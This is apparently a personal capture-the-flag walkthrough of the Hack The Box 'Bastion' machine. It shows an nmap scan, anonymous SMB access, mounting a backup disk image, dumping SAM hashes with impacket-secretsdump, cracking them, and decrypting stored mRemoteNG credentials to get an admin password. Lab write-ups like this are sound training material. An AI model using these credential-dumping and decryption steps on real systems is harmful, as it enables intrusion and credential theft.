nmap
```
┌──(kali㉿kali)-[~/HTB/bastion]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.136.29 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 02:28 EST
Warning: 10.129.136.29 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.136.29
Host is up (0.046s latency).
Not shown: 64753 closed tcp ports (reset), 769 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2016 or Server 2019 (96%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 (94%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 R2 (93%)                                                                               
No exact OS matches for host (test conditions non-ideal).                                                                                  
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-16T08:31:41+01:00
| smb2-time: 
|   date: 2025-01-16T07:31:40
|_  start_date: 2025-01-16T07:27:06
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   45.38 ms 10.10.14.1
2   45.74 ms 10.129.136.29

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.29 seconds
```

use smbclient to see the shares
```
smbclient -N -L //10.129.136.29 
```

we can enter smclient
```
smbclient -N //10.129.136.29/backups
```

![Pasted image 20250116153703](<0. Attachments/Pasted image 20250116153703.png>)

![Pasted image 20250116153717](<0. Attachments/Pasted image 20250116153717.png>)

to mount the share
```
sudo mount -t cifs //10.129.136.29/backups /home/kali/HTB/bastion/backups -o user=,password=
```

![Pasted image 20250116154114](<0. Attachments/Pasted image 20250116154114.png>)

install a tool for mounting virtual images called guestmount
```
sudo apt install libguestfs-tools
```

![Pasted image 20250116154408](<0. Attachments/Pasted image 20250116154408.png>)

after mounting
![Pasted image 20250116155548](<0. Attachments/Pasted image 20250116155548.png>)
```
guestmount --add backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro mnt
```

getting the secretsdump from SAM
![Pasted image 20250116160516](<0. Attachments/Pasted image 20250116160516.png>)
```
┌──(kali㉿kali)-[~/…/mnt/Windows/System32/config]
└─$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword 
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```

on crackstation - [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
![Pasted image 20250116161046](<0. Attachments/Pasted image 20250116161046.png>)

we can now ssh
![Pasted image 20250116161412](<0. Attachments/Pasted image 20250116161412.png>)

priv esc
to see hidden files use
```
dir /a:h
```
![Pasted image 20250116161803](<0. Attachments/Pasted image 20250116161803.png>)

we have some creds but they are encrypted
![Pasted image 20250116162618](<0. Attachments/Pasted image 20250116162618.png>)

we now need to find some way to decrypt it
https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py
![Pasted image 20250116163405](<0. Attachments/Pasted image 20250116163405.png>)

admin pass - `thXLHM96BeKL0ER2`

![Pasted image 20250116163541](<0. Attachments/Pasted image 20250116163541.png>)

